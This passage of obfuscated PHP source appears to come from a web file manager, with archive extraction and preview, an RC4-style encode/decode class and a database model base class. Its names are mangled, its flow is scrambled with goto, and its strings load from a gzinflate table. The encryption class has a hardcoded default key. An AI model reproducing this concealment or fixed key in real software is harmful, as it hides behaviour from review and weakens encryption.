unset($B¿ãƒ‹½¼ì[$a¤óËä†¹Ã][$A‡ÒÖµ‚æ‡[1890]]); } } return array($A‡ÒÖµ‚æ‡[1028] => !0, $A‡ÒÖµ‚æ‡[1030] => $B¿ãƒ‹½¼ì); } else { return array($A‡ÒÖµ‚æ‡[1028] => !1, $A‡ÒÖµ‚æ‡[1030] => $B¿ãƒ‹½¼ì); } } static function extract($e ¥…Í­ï¬, $C‡êçÄ®Ë, $eº­¥˜·å» = "\x2d\x31", &$FµÔ¦Í™Ó = false) { goto f„ŸÙ£ÍÚÚ; f„ŸÙ£ÍÚÚ: $d„øáâ‡²Ë =& $_SERVER[Ìó]; self::init(); $Dœà›á±…À = !empty($GLOBALS[$d„øáâ‡²Ë[1045]]) ? $GLOBALS[$d„øáâ‡²Ë[1045]] : get_path_ext($e ¥…Í­ï¬); goto eïÏãÉ´ĞÑ; D¯”íÈÎ: if (self::checkIfType($Dœà›á±…À, $d„øáâ‡²Ë[1869])) { if ($eº­¥˜·å» != $d„øáâ‡²Ë[1027]) { $c…Œ‡™ÜŞš = unzip_pre_name($c…Œ‡™ÜŞš); $Eğ¤Äº»â£ = unzip_pre_name($Eğ¤Äº»â£); $C£Œ„‘‡ğÀ = PclTarExtractList($e ¥…Í­ï¬, array($c…Œ‡™ÜŞš), $C‡êçÄ®Ë, $Eğ¤Äº»â£, $Dœà›á±…À); } else { $C£Œ„‘‡ğÀ = PclTarExtract($e ¥…Í­ï¬, $C‡êçÄ®Ë, $d„øáâ‡²Ë[357], $Dœà›á±…À); } return array($d„øáâ‡²Ë[1028] => $C£Œ„‘‡ğÀ, $d„øáâ‡²Ë[1030] => PclErrorString(!0)); } else { if (self::checkIfType($Dœà›á±…À, $d„øáâ‡²Ë[1041])) { return kodRarArchive::extract($e ¥…Í­ï¬, $C‡êçÄ®Ë, $Dœà›á±…À, $FµÔ¦Í™Ó); } else { if (kodZipArchive::support($d„øáâ‡²Ë[1891])) { return kodZipArchive::extract($e ¥…Í­ï¬, $C‡êçÄ®Ë, $FµÔ¦Í™Ó); } else { $D¿Ò©‘ = new PclZip($e ¥…Í­ï¬); if ($eº­¥˜·å» != $d„øáâ‡²Ë[1027]) { $C£Œ„‘‡ğÀ = $D¿Ò©‘->extract(PCLZIP_OPT_PATH, $C‡êçÄ®Ë, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d„øáâ‡²Ë[1892], PCLZIP_OPT_BY_NAME, $eÑ‡çÑğæ°[$d„øáâ‡²Ë[1887]], PCLZIP_OPT_REMOVE_PATH, $Eğ¤Äº»â£, PCLZIP_OPT_REPLACE_NEWER); } else { $C£Œ„‘‡ğÀ = $D¿Ò©‘->extract(PCLZIP_OPT_PATH, $C‡êçÄ®Ë, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d„øáâ‡²Ë[1892], PCLZIP_OPT_REPLACE_NEWER); } return array($d„øáâ‡²Ë[1028] => $C£Œ„‘‡ğÀ, $d„øáâ‡²Ë[1030] => $D¿Ò©‘->errorName(!0)); } } } return array($d„øáâ‡²Ë[1028] => !1, $d„øáâ‡²Ë[1030] => $d„øáâ‡²Ë[1893]); goto F“³Äî“™¿; eïÏãÉ´ĞÑ: $DêŒµ©“‚ = self::listContent($e ¥…Í­ï¬, !1); if (!$DêŒµ©“‚[$d„øáâ‡²Ë[1028]]) { return $DêŒµ©“‚; } if ($eº­¥˜·å» != $d„øáâ‡²Ë[1027]) { goto e—ÇŸ¶·Œé; C©ö‚³Šæò: if ($eÑ‡çÑğæ°[$d„øáâ‡²Ë[76]]) { $c…Œ‡™ÜŞš = rtrim($c…Œ‡™ÜŞš, $d„øáâ‡²Ë[8]) . $d„øáâ‡²Ë[8]; $FµÔ¦Í™Ó = array($FµÔ¦Í™Ó); } $aÏ‘ÎÊã = str_replace($d„øáâ‡²Ë[93], $d„øáâ‡²Ë[8], $c…Œ‡™ÜŞš); if (substr($aÏ‘ÎÊã, -1) == $d„øáâ‡²Ë[8]) { if (!strstr(trim($aÏ‘ÎÊã, $d„øáâ‡²Ë[8]), $d„øáâ‡²Ë[8])) { $C‡êçÄ®Ë = $C‡êçÄ®Ë . get_path_this($aÏ‘ÎÊã) . $d„øáâ‡²Ë[8]; } } else { if ($Eğ¤Äº»â£ == $c…Œ‡™ÜŞš) { $Eğ¤Äº»â£ = $d„øáâ‡²Ë[33]; } } goto cÌ†ƒêÀ; e—ÇŸ¶·Œé: $eÑ‡çÑğæ° = self::fileIndex($DêŒµ©“‚[$d„øáâ‡²Ë[1030]], $eº­¥˜·å»); $FµÔ¦Í™Ó = str_replace(array($d„øáâ‡²Ë[1068], $d„øáâ‡²Ë[1889]), $d„øáâ‡²Ë[70], $eÑ‡çÑğæ°[$d„øáâ‡²Ë[1887]]); $c…Œ‡™ÜŞš = $FµÔ¦Í™Ó; goto a‹Ç…¼²ß²; a‹Ç…¼²ß²: if ($GLOBALS[$d„øáâ‡²Ë[6]][$d„øáâ‡²Ë[1141]] != $d„øáâ‡²Ë[322]) { $c…Œ‡™ÜŞš = unzip_pre_name($FµÔ¦Í™Ó); } $Eğ¤Äº»â£ = get_path_father($FµÔ¦Í™Ó); if ($Eğ¤Äº»â£ == $FµÔ¦Í™Ó) { $Eğ¤Äº»â£ = $d„øáâ‡²Ë[33]; } goto C©ö‚³Šæò; cÌ†ƒêÀ: } goto D¯”íÈÎ; F“³Äî“™¿: } static function fileIndex($Cã„–ƒ’ì, $AíÔ©èµŒ‹, $aÉÕŒ‰Øø = false) { goto d‡’ãÉ¨Ä¼; d‡’ãÉ¨Ä¼: $FÏİÚ²Ò¾‹ =& $_SERVER[Ìó]; self::init(); if (!is_array($Cã„–ƒ’ì)) { return !1; } goto bè¶†ÒÔ¡; bè¶†ÒÔ¡: $A™—Ììù«¬ = count($Cã„–ƒ’ì); for ($b§¨™¬¿¡  = 0; $b§¨™¬¿¡  < $A™—Ììù«¬; $b§¨™¬¿¡ ++) { if ($AíÔ©èµŒ‹ == $Cã„–ƒ’ì[$b§¨™¬¿¡ ][$FÏİÚ²Ò¾‹[1032]]) { $cìÚçÙ‹ä¼ = $Cã„–ƒ’ì[$b§¨™¬¿¡ ]; break; } } if (!$cìÚçÙ‹ä¼) { show_tips($FÏİÚ²Ò¾‹[1894]); } goto E­›áåŸ”‘; E­›áåŸ”‘: $eÏØ­Óî‹Ş = $cìÚçÙ‹ä¼; if ($aÉÕŒ‰Øø) { $eÏØ­Óî‹Ş = $cìÚçÙ‹ä¼[$aÉÕŒ‰Øø]; if ($cìÚçÙ‹ä¼[$FÏİÚ²Ò¾‹[76]]) { $eÏØ­Óî‹Ş = rtrim($eÏØ­Óî‹Ş, $FÏİÚ²Ò¾‹[8]) . $FÏİÚ²Ò¾‹[8]; } } return $eÏØ­Óî‹Ş; goto C¼Íß‚¢ÏÕ; C¼Íß‚¢ÏÕ: } static function extractZipFile($a…çàî½æ, $dÔÓ—Ó‡É¬, $F™­Â¤‰¶ = false) { goto d¢îïºŸî¹; d¢îïºŸî¹: $A‚åäƒ†Õ =& $_SERVER[Ìó]; self::init(); $b§º™óİ‚ = TEMP_FILES . hash_path($a…çàî½æ) . $A‚åäƒ†Õ[8]; goto aŠãèäğº‘; f»æŠ¡Ï«Ñ: $A—§«ƒŠéğ = get_path_father($dÔÓ—Ó‡É¬); if ($A—§«ƒŠéğ == $dÔÓ—Ó‡É¬) { $A—§«ƒŠéğ = $A‚åäƒ†Õ[33]; } $B•ÅÎ»ë = $cä†©½¸õ->extract(PCLZIP_OPT_PATH, $b§º™óİ‚, PCLZIP_CB_PRE_FILE_NAME, $A‚åäƒ†Õ[1892], PCLZIP_OPT_REMOVE_PATH, $A—§«ƒŠéğ, PCLZIP_OPT_BY_NAME, $dÔÓ—Ó‡É¬); goto a÷¾Ä’ËÊ“; a÷¾Ä’ËÊ“: if (!file_exists($BÇ¨¿š†‰›)) { return !1; } @rename($BÇ¨¿š†‰›, $eÉ–ºõçĞ¡); return $eÉ–ºõçĞ¡; goto a•²ù‰‡–ã; E–½½‡®¦»: if (file_exists($eÉ–ºõçĞ¡)) { return $eÉ–ºõçĞ¡; } $cä†©½¸õ = new PclZip($a…çàî½æ); $BÇ¨¿š†‰› = unzip_filter_ext($b§º™óİ‚ . get_path_this($dÔÓ—Ó‡É¬)); goto f»æŠ¡Ï«Ñ; aŠãèäğº‘: mk_dir($b§º™óİ‚); $eÉ–ºõçĞ¡ = $b§º™óİ‚ . md5($a…çàî½æ . $dÔÓ—Ó‡É¬); if ($F™­Â¤‰¶) { $eÉ–ºõçĞ¡ = $b§º™óİ‚ . $F™­Â¤‰¶; } goto E–½½‡®¦»; a•²ù‰‡–ã: } static function filePreview($BäÀÇ£–¥á, $CÇù˜¹ËŒä, $eè¡Áƒ•»Š = false, $dé´Ëä• = false) { goto FÆÓåºòÑ; c¤°‹ÍáğÈ: $D½Š»ì‡ø¹ = unzip_pre_name($D½Š»ì‡ø¹); $cøˆÚŞˆ·É = get_path_this($D½Š»ì‡ø¹); $F„²‰¾Ô®‡ = unzip_filter_ext($A´‘Ÿ¿‡® . $cøˆÚŞˆ·É); goto Fö²¾¨™°; C†“Â«èõ†: mk_dir($A´‘Ÿ¿‡®); $A¥˜¥ŒœÇ = $A´‘Ÿ¿‡® . md5($BäÀÇ£–¥á . $CÇù˜¹ËŒä . $dé´Ëä•); $D½Š»ì‡ø¹ = $fá½Óªğ—Ç[33]; goto bèğ¯ÈìÖĞ; bèğ¯ÈìÖĞ: $aÖ‡‹çŒâ = self::extract($BäÀÇ£–¥á, $A´‘Ÿ¿‡®, $CÇù˜¹ËŒä, $D½Š»ì‡ø¹); if (is_array($D½Š»ì‡ø¹)) { show_json($fá½Óªğ—Ç[1895], !1); } if (file_exists($A¥˜¥ŒœÇ)) { IO::fileOut($A¥˜¥ŒœÇ, $eè¡Áƒ•»Š, get_path_this($D½Š»ì‡ø¹)); return; } goto c¤°‹ÍáğÈ; d¬¿ñ¾àòí: if (!file_exists($A¥˜¥ŒœÇ)) { del_dir($A´‘Ÿ¿‡®); show_json($fá½Óªğ—Ç[1897]); } IO::fileOut($A¥˜¥ŒœÇ, $eè¡Áƒ•»Š, $cøˆÚŞˆ·É); goto CÚ°×éÂßè; FÆÓåºòÑ: $fá½Óªğ—Ç =& $_SERVER[Ìó]; self::init(); $A´‘Ÿ¿‡® = TEMP_FILES . hash_path($BäÀÇ£–¥á) . $fá½Óªğ—Ç[8]; goto C†“Â«èõ†; Fö²¾¨™°: if (!$aÖ‡‹çŒâ[$fá½Óªğ—Ç[1028]]) { show_json($aÖ‡‹çŒâ[$fá½Óªğ—Ç[1030]], !1); } if (!file_exists($F„²‰¾Ô®‡)) { show_json($fá½Óªğ—Ç[1896], !1); } @rename($F„²‰¾Ô®‡, $A¥˜¥ŒœÇ); goto d¬¿ñ¾àòí; CÚ°×éÂßè: } static function create($fñ‹ÖééÙ, $AÂ†ÍÄ•¡ñ) { $ašÁç²Ã¿ =& $_SERVER[Ìó]; self::init(); $EÅèÒ‘õ = get_path_ext($fñ‹ÖééÙ); $EÃ†í©Ô¸õ = !1; if (self::checkIfType($EÅèÒ‘õ, $ašÁç²Ã¿[297])) { if (kodZipArchive::support($ašÁç²Ã¿[1006])) { return kodZipArchive::create($fñ‹ÖééÙ, $AÂ†ÍÄ•¡ñ); } $bÛàù»³È = new PclZip($fñ‹ÖééÙ); foreach ($AÂ†ÍÄ•¡ñ as $bØì†äÜá => $A‡ĞÎÓ›®) { $A‡ĞÎÓ›® = str_replace($ašÁç²Ã¿[462], $ašÁç²Ã¿[8], $A‡ĞÎÓ›®); $F¸¤Òİñö = Kodio::clear(get_path_father($A‡ĞÎÓ›®)); if ($bØì†äÜá == 0) { $EÃ†í©Ô¸õ = $bÛàù»³È->create($A‡ĞÎÓ›®, PCLZIP_OPT_REMOVE_PATH, $F¸¤Òİñö, PCLZIP_CB_PRE_FILE_NAME, $ašÁç²Ã¿[1898]); continue; } $EÃ†í©Ô¸õ = $bÛàù»³È->add($A‡ĞÎÓ›®, PCLZIP_OPT_REMOVE_PATH, $F¸¤Òİñö, PCLZIP_CB_PRE_FILE_NAME, $ašÁç²Ã¿[1898]); } } else { if (self::checkIfType($EÅèÒ‘õ, $ašÁç²Ã¿[1869])) { foreach ($AÂ†ÍÄ•¡ñ as $bØì†äÜá => $A‡ĞÎÓ›®) { $A‡ĞÎÓ›® = str_replace($ašÁç²Ã¿[462], $ašÁç²Ã¿[8], $A‡ĞÎÓ›®); $F¸¤Òİñö = Kodio::clear(get_path_father($A‡ĞÎÓ›®)); if ($bØì†äÜá == 0) { $EÃ†í©Ô¸õ = PclTarCreate($fñ‹ÖééÙ, array($A‡ĞÎÓ›®), $EÅèÒ‘õ, null, $F¸¤Òİñö); continue; } $EÃ†í©Ô¸õ = PclTarAddList($fñ‹ÖééÙ, array($A‡ĞÎÓ›®), $ašÁç²Ã¿[33], $F¸¤Òİñö, $EÅèÒ‘õ); } } } return $EÃ†í©Ô¸õ; } } class Mcrypt { public static $defaultKey = "\x61\x21\x74\141\x6b\101\x3a\144\154\155\143\154\144\x45\x76\x2c\145"; public static function encode($b¶ç²–¥ì, $dğÀÚª½é© = '', $d•Î¾Ûí‘Ô = 0, $Bêª¥İ©†í = '') { goto eÈ–®¯«Çæ; d÷…‹ï£¤‹: $b¶ç²–¥ì = sprintf($Báï¼Å›„[1899], $d•Î¾Ûí‘Ô ? $d•Î¾Ûí‘Ô + time() : 0) . substr(md5($b¶ç²–¥ì . $b¤¯©ÒÄ’ù), 0, 16) . $b¶ç²–¥ì; $d†‹´éŠØÁ = strlen($b¶ç²–¥ì); $C¹­Õ„Õ– = array(); goto c¼‡«˜ß»é; eÈ–®¯«Çæ: $Báï¼Å›„ =& $_SERVER[Ìó]; $FÉ³ –µÌ½ = 4; $dğÀÚª½é© = md5($dğÀÚª½é© ? $dğÀÚª½é© : self::$defaultKey); goto eè´Ú–÷íê; eè´Ú–÷íê: $DÎÅé™Öæ„ = md5(substr($dğÀÚª½é©, 0, 16)); $b¤¯©ÒÄ’ù = md5(substr($dğÀÚª½é©, 16, 16)); $Bêª¥İ©†í = $Bêª¥İ©†í ? $Bêª¥İ©†í : md5(microtime()); goto C¾Ä¶–ùŸ£; C¾Ä¶–ùŸ£: $e–²ç½´© = substr($Bêª¥İ©†í, -$FÉ³ –µÌ½); $Fáƒ¦ÍëÈ“ = $DÎÅé™Öæ„ . md5($DÎÅé™Öæ„ . $e–²ç½´©); $DÄ¬ğŠ°è = strlen($Fáƒ¦ÍëÈ“); goto d÷…‹ï£¤‹; c¼‡«˜ß»é: for ($aÁˆÖÜ§œŒ = 0; $aÁˆÖÜ§œŒ <= 255; $aÁˆÖÜ§œŒ++) { $C¹­Õ„Õ–[$aÁˆÖÜ§œŒ] = ord($Fáƒ¦ÍëÈ“[$aÁˆÖÜ§œŒ % $DÄ¬ğŠ°è]); } $D¼µ™µ±¾  = range(0, 255); for ($BÍÄ³Øâ¼ = $aÁˆÖÜ§œŒ = 0; $aÁˆÖÜ§œŒ < 256; $aÁˆÖÜ§œŒ++) { $BÍÄ³Øâ¼ = ($BÍÄ³Øâ¼ + $D¼µ™µ±¾ [$aÁˆÖÜ§œŒ] + $C¹­Õ„Õ–[$aÁˆÖÜ§œŒ]) % 256; $F£Ş÷Ä¯ÎÛ = $D¼µ™µ±¾ [$aÁˆÖÜ§œŒ]; $D¼µ™µ±¾ [$aÁˆÖÜ§œŒ] = $D¼µ™µ±¾ [$BÍÄ³Øâ¼]; $D¼µ™µ±¾ [$BÍÄ³Øâ¼] = $F£Ş÷Ä¯ÎÛ; } goto cÒÒ‡›ÎÚî; cÒÒ‡›ÎÚî: $bø—˜†ÎÛ = $Báï¼Å›„[33]; for ($Cø†’ò‹ç = $BÍÄ³Øâ¼ = $aÁˆÖÜ§œŒ = 0; $aÁˆÖÜ§œŒ < $d†‹´éŠØÁ; $aÁˆÖÜ§œŒ++) { $Cø†’ò‹ç = ($Cø†’ò‹ç + 1) % 256; $BÍÄ³Øâ¼ = ($BÍÄ³Øâ¼ + $D¼µ™µ±¾ [$Cø†’ò‹ç]) % 256; $F£Ş÷Ä¯ÎÛ = $D¼µ™µ±¾ [$Cø†’ò‹ç]; $D¼µ™µ±¾ [$Cø†’ò‹ç] = $D¼µ™µ±¾ [$BÍÄ³Øâ¼]; $D¼µ™µ±¾ [$BÍÄ³Øâ¼] = $F£Ş÷Ä¯ÎÛ; $bø—˜†ÎÛ .= chr(ord($b¶ç²–¥ì[$aÁˆÖÜ§œŒ]) ^ $D¼µ™µ±¾ [($D¼µ™µ±¾ [$Cø†’ò‹ç] + $D¼µ™µ±¾ [$BÍÄ³Øâ¼]) % 256]); } $bø—˜†ÎÛ = $e–²ç½´© . str_replace($Báï¼Å›„[905], $Báï¼Å›„[33], base64_encode($bø—˜†ÎÛ)); goto A‘´¬â; A‘´¬â: $bø—˜†ÎÛ = str_replace(array($Báï¼Å›„[280], $Báï¼Å›„[8], $Báï¼Å›„[905]), array($Báï¼Å›„[407], $Báï¼Å›„[70], $Báï¼Å›„[91]), $bø—˜†ÎÛ); return $bø—˜†ÎÛ; goto Fë‹÷ËÏÛ; Fë‹÷ËÏÛ: } public static function decode($A¼ßİ¸”—÷, $bæ¤­òÌ™† = '') { goto Bò‚áùªø; Bò‚áùªø: $c×·æ¹Şƒ» =& $_SERVER[Ìó]; $A¼ßİ¸”—÷ = str_replace(array($c×·æ¹Şƒ»[407], $c×·æ¹Şƒ»[70], $c×·æ¹Şƒ»[91]), array($c×·æ¹Şƒ»[280], $c×·æ¹Şƒ»[8], $c×·æ¹Şƒ»[905]), $A¼ßİ¸”—÷); $C¸èŒ…äÑ = 4; goto Dê‰ØäùÆÀ; eÓ×øèºŠ: $C¿ë’õ²Åˆ = $c×·æ¹Şƒ»[33]; for ($dñÑ¸ù×ˆ = $C·ËŒ¸ğ§Ğ = $d‚êç©ö = 0; $d‚êç©ö < $aÌ‹¨ÏğÌğ; $d‚êç©ö++) { $dñÑ¸ù×ˆ = ($dñÑ¸ù×ˆ + 1) % 256; $C·ËŒ¸ğ§Ğ = ($C·ËŒ¸ğ§Ğ + $CË‰·õ­[$dñÑ¸ù×ˆ]) % 256; $cæ‚õ±‰¨ = $CË‰·õ­[$dñÑ¸ù×ˆ]; $CË‰·õ­[$dñÑ¸ù×ˆ] = $CË‰·õ­[$C·ËŒ¸ğ§Ğ]; $CË‰·õ­[$C·ËŒ¸ğ§Ğ] = $cæ‚õ±‰¨; $C¿ë’õ²Åˆ .= chr(ord($A¼ßİ¸”—÷[$d‚êç©ö]) ^ $CË‰·õ­[($CË‰·õ­[$dñÑ¸ù×ˆ] + $CË‰·õ­[$C·ËŒ¸ğ§Ğ]) % 256]); } $C­³®áóÌ = intval(substr($C¿ë’õ²Åˆ, 0, 10)); goto A‘— ‰Ô®Æ; eËÖË–ùÎ‚: for ($d‚êç©ö = 0; $d‚êç©ö <= 255; $d‚êç©ö++) { $EùÉ†“í ˆ[$d‚êç©ö] = ord($BÑÌ“¢›®ª[$d‚êç©ö % $a˜Ü–ÌÑ‡]); } $CË‰·õ­ = range(0, 255); for ($C·ËŒ¸ğ§Ğ = $d‚êç©ö = 0; $d‚êç©ö < 256; $d‚êç©ö++) { $C·ËŒ¸ğ§Ğ = ($C·ËŒ¸ğ§Ğ + $CË‰·õ­[$d‚êç©ö] + $EùÉ†“í ˆ[$d‚êç©ö]) % 256; $cæ‚õ±‰¨ = $CË‰·õ­[$d‚êç©ö]; $CË‰·õ­[$d‚êç©ö] = $CË‰·õ­[$C·ËŒ¸ğ§Ğ]; $CË‰·õ­[$C·ËŒ¸ğ§Ğ] = $cæ‚õ±‰¨; } goto eÓ×øèºŠ; B™­ ±Èä: $A¼ßİ¸”—÷ = base64_decode(substr($A¼ßİ¸”—÷, $C¸èŒ…äÑ)); $aÌ‹¨ÏğÌğ = strlen($A¼ßİ¸”—÷); $EùÉ†“í ˆ = array(); goto eËÖË–ùÎ‚; b‘±öÖÌÙ„: $Bò³ÆÕÕÎ = substr($A¼ßİ¸”—÷, 0, $C¸èŒ…äÑ); $BÑÌ“¢›®ª = $d¡¼‹¿Í‡ . md5($d¡¼‹¿Í‡ . $Bò³ÆÕÕÎ); $a˜Ü–ÌÑ‡ = strlen($BÑÌ“¢›®ª); goto B™­ ±Èä; A‘— ‰Ô®Æ: if (($C­³®áóÌ == 0 || $C­³®áóÌ - time() > 0) && substr($C¿ë’õ²Åˆ, 10, 16) == substr(md5(substr($C¿ë’õ²Åˆ, 26) . $d˜²ˆ·ƒè ), 0, 16)) { return substr($C¿ë’õ²Åˆ, 26); } else { return $c×·æ¹Şƒ»[33]; } goto bĞÀ«¤¾ô‡; Dê‰ØäùÆÀ: $bæ¤­òÌ™† = md5($bæ¤­òÌ™† ? $bæ¤­òÌ™† : self::$defaultKey); $d¡¼‹¿Í‡ = md5(substr($bæ¤­òÌ™†, 0, 16)); $d˜²ˆ·ƒè  = md5(substr($bæ¤­òÌ™†, 16, 16)); goto b‘±öÖÌÙ„; bĞÀ«¤¾ô‡: } } define($_SERVER[Ìó][1900], 1); goto b«ß—œ†—Œ; bİÜ¾£‚‘: $aø„ØºßÁ÷ = $_SERVER[Ìó][542]; if (!$aø„ØºßÁ÷) { die; } $_SERVER[Ç] = explode($_SERVER[Ìó][543], gzinflate(substr($_SERVER[Ìó][544], 10, -8))); goto EÙÌèåØï³; A§ÏÜöšÂà: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\171\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\163\x65\162\x74\x2c\x75\x70\144\x61\x74\145", "\x66\x75\156\x63\x74\151\157\156"), array("\x63\162\145\141\x74\145\124\x69\155\145", "\x74\151\155\x65", "\151\156\163\145\x72\164", "\146\x75\x6e\143\164\x69\x6f\156")); public function setDataAuto($DçÍãğ™•“) { $this->dataAuto = $DçÍãğ™•“; } public function __construct($D„¼í¶øÜä = '', $D³¡ºœƒó = '', $FÄğ—öÆâ = '') { parent::__construct($D„¼í¶øÜä, $D³¡ºœƒó, $FÄğ—öÆâ); } public static function textEncode($BÆº¸Î½ÜŠ) { if (!$BÆº¸Î½ÜŠ) { return $BÆº¸Î½ÜŠ; } $CéÛ”…Ä¾ = json_encode($BÆº¸Î½ÜŠ); $CéÛ”…Ä¾ = preg_replace_callback($_SERVER[Ìó][338], function ($bÏ÷«Œ§×) { return addslashes($bÏ÷«Œ§×[0]); }, $CéÛ”…Ä¾); return json_decode($CéÛ”…Ä¾); } public static function textDecode($fˆ’™İ´½‰) { $e¼ùßåˆ¦ =& $_SERVER[Ìó]; $dŞ¾ÌßÆ…Ì = json_encode($fˆ’™İ´½‰); $dŞ¾ÌßÆ…Ì = preg_replace_callback($e¼ùßåˆ¦[339], function ($BíÑªèŒ÷Ø) { return $_SERVER[Ìó][93]; }, $dŞ¾ÌßÆ…Ì); return json_decode($dŞ¾ÌßÆ…Ì); } protected $tableMeta = array(); protected function _beforeInsert(&$CŞ‹…Ğ©Œ, $Bïá›ÄÜñ–) { $E†½ßŠï‘™ =& $_SERVER[Ìó]; if (!$this->checkDataAutoHas($E†½ßŠï‘™[340])) { return; } $this->dataBeforeFilter($CŞ‹…Ğ©Œ, $E†½ßŠï‘™[340]); } protected function _beforeUpdate(&$eœÇŞàãç, $b­º¾Ñ¬°±) { $CÙ¹Åê¾˜¤ =& $_SERVER[Ìó]; if (!$this->checkDataAutoHas($CÙ¹Åê¾˜¤[341])) { return; } $this->dataBeforeFilter($eœÇŞàãç, $CÙ¹Åê¾˜¤[341]); } protected function _afterSelect(&$fÛÆß©–’‚, $f©£È’ÏÏ²) { if (!is_array($fÛÆß©–’‚)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ìó][342])) { return; } foreach ($fÛÆß©–’‚ as &$d£‚•âÔé‰) { $this->dataAfterFilter($d£‚•âÔé‰); } } protected function _afterFind(&$a—£ò½¦³, $Bñ÷²ÄÖÙ) { if (!is_array($a—£ò½¦³)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ìó][342])) { return; } $this->dataAfterFilter($a—£ò½¦³); } public function setAutoIncrement($EÕ²…¹ç) { $AÓï´Œ…á = array($this->getPk() => $EÕ²…¹ç); $f²ïèãÊ”† = $this->data($AÓï´Œ…á)->add(); if ($f²ïèãÊ”†) { $this->delete($f²ïèãÊ”†); } } public function getAutoIncrement() { $c™¯µ»ëø = $this->getTableName(); $d‘²ã‘„‡ = $this->max($this->getPk()); $Bõ“§ÚŠ = $this->query("\x73\150\x6f\x77\x20\x74\x61\142\x6c\x65\40\163\x74\x61\164\165\163\x20\167\150\x65\162\x65\40\116\x61\x6d\x65\75\x27{$c™¯µ»ëø}\47"); $f´ŒÄäö®¶ = $Bõ“§ÚŠ[0][$_SERVER[Ìó][343]]; $F‡Ñì×÷Ôß = max($d‘²ã‘„‡, $f´ŒÄäö®¶); return $F‡Ñì×÷Ôß; } protected function _callBefore($A‚Ì¸Êô–Ë, $eİµâ­…‹) { return $this->cacheCallCheck($A‚Ì¸Êô–Ë, $eİµâ­…‹, !1); } protected function _callAfter($fê ÛË‰ğ•, $B‚¹”ÜÖî) { return $this->cacheCallCheck($fê ÛË‰ğ•, $B‚¹”ÜÖî, !0); } protected function cacheFunctionAlias($d»’ÎíÂÀ§) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($EÒøƒ¥Ü¢É, $F¹Ë—¹¨§, $fë»‡Â¿ = false) { $E‹êïß­Ì = $this->cacheFunctionAlias($F¹Ë—¹¨§); if (!$E‹êïß­Ì) { return; } foreach ($E‹êïß­Ì as $A•³Ğå¢â => $Eİ¥áø¡ˆ) { $Aâ‘¥°õÀà = $Eİ¥áø¡ˆ[0]; $BŠÎ¢¥´ª = explode($_SERVER[Ìó][47], $Eİ¥áø¡ˆ[1]); if ($EÒøƒ¥Ü¢É == $A•³Ğå¢â) { return $this->cacheFunctionGet($A•³Ğå¢â, $Aâ‘¥°õÀà); } if ($fë»‡Â¿ && in_array($EÒøƒ¥Ü¢É, $BŠÎ¢¥´ª)) { $this->cacheFunctionClear($A•³Ğå¢â, $Aâ‘¥°õÀà); } } } public function cacheFunctionGet($CéÌ§ÁË¶, $CôŸ¿°îË„) { $B‰Ä™œìšÇ = $this->cacheKeyMake($CéÌ§ÁË¶, $CôŸ¿°îË„); $Cæ·ÓÉÎ»Ş = Cache::get($B‰Ä™œìšÇ); if (!is_array($Cæ·ÓÉÎ»Ş)) { $Cæ·ÓÉÎ»Ş = call_user_func_array(array($this, $CéÌ§ÁË¶), array($CôŸ¿°îË„, !0)); Cache::set($B‰Ä™œìšÇ, $Cæ·ÓÉÎ»Ş); } return $Cæ·ÓÉÎ»Ş; } public function cacheFunctionClear($CèÁ‰ˆß‹“, $Fæöè½¯–Ÿ) { $FÑºÅÙÓå = $Fæöè½¯–Ÿ; if (!is_array($Fæöè½¯–Ÿ)) { $FÑºÅÙÓå = array($Fæöè½¯–Ÿ); } foreach ($FÑºÅÙÓå as $AÜÚÁ…­˜Ù) { $b“º´„š„ = $this->cacheKeyMake($CèÁ‰ˆß‹“, $AÜÚÁ…­˜Ù); Cache::remove($b“º´„š„); } } private function cacheKeyMake($Eª¸‘šà, $B”øóƒŞÜé) { $eÔ¹µÏğ¹å =& $_SERVER[Ìó]; return get_class($this) . $eÔ¹µÏğ¹å[70] . $Eª¸‘šà . $eÔ¹µÏğ¹å[344] . $B”øóƒŞÜé; } protected function selectPage($F²äù÷äÇë = 200, $bà¨öÖ¥äñ = 1) { goto dŠÑôòÄ‡Ñ; BÇ©ÂÂ‹: $e”™·¢Î…¸ = ceil($dß÷’ÛÖğ† / $F²äù÷äÇë); $bà¨öÖ¥äñ = intval(isset($in[$BÑøÊê…¾ì[336]]) ? $in[$BÑøÊê…¾ì[336]] : $bà¨öÖ¥äñ); $bà¨öÖ¥äñ = $bà¨öÖ¥äñ <= 1 ? 1 : ($bà¨öÖ¥äñ >= $e”™·¢Î…¸ ? $e”™·¢Î…¸ : $bà¨öÖ¥äñ); goto Eã°¦¸£¡¤; BñÛñöå‘Ş: $dß÷’ÛÖğ† = intval($this->count()); $F²äù÷äÇë = intval($F²äù÷äÇë); $F²äù÷äÇë = $F²äù÷äÇë <= 5 ? 5 : ($F²äù÷äÇë >= $c˜ò‰ÂÕš ? $c˜ò‰ÂÕš : $F²äù÷äÇë); goto BÇ©ÂÂ‹; Bõ‚ŒÕ—Ô™: $c˜ò‰ÂÕš = 4000; $F²äù÷äÇë = isset($in[$BÑøÊê…¾ì[345]]) ? $in[$BÑøÊê…¾ì[345]] : $F²äù÷äÇë; if ($F²äù÷äÇë === -1) { unset($in[$BÑøÊê…¾ì[345]]); $c˜ò‰ÂÕš = 100000000; $F²äù÷äÇë = $c˜ò‰ÂÕš; } goto c¸ª¡Ø‡À£; dŠÑôòÄ‡Ñ: $BÑøÊê…¾ì =& $_SERVER[Ìó]; global $in; $D©—š­Ö» = $this->optionsValue(); goto Bõ‚ŒÕ—Ô™; c¸ª¡Ø‡À£: $c¨œß¶Ä§Õ = $D©—š­Ö»; $c¨œß¶Ä§Õ[$BÑøÊê…¾ì[346]] = array(); $this->optionsValue($c¨œß¶Ä§Õ); goto BñÛñöå‘Ş; a÷´íÃ”ç: if ($e”™·¢Î…¸ == 1) { $dß÷’ÛÖğ† = count($eˆâ†ÂÒô’); } $Fá¬ òšîà = array($BÑøÊê…¾ì[347] => array($BÑøÊê…¾ì[348] => $dß÷’ÛÖğ†, 